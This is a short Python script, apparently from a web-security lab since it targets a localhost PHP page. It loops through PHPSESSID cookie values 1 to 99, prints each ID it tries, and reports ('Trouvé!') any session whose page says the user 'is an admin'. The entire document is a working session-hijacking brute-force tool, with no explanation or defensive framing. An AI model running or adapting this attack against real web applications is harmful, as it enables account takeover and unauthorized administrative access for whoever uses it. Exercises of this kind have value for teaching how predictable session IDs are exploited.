import requests, re

from requests.models import Response

url = 'http://localhost/Session%20Id/see.php'

session = requests.Session()


for session_id in range(1, 100):
    response = session.get(url, cookies= {"PHPSESSID": str(session_id)})
    content = response.text

    if("is an admin" in content):
        print("Trouvé! ", session_id)
        print(content)
    else:
        print("testé: ", session_id)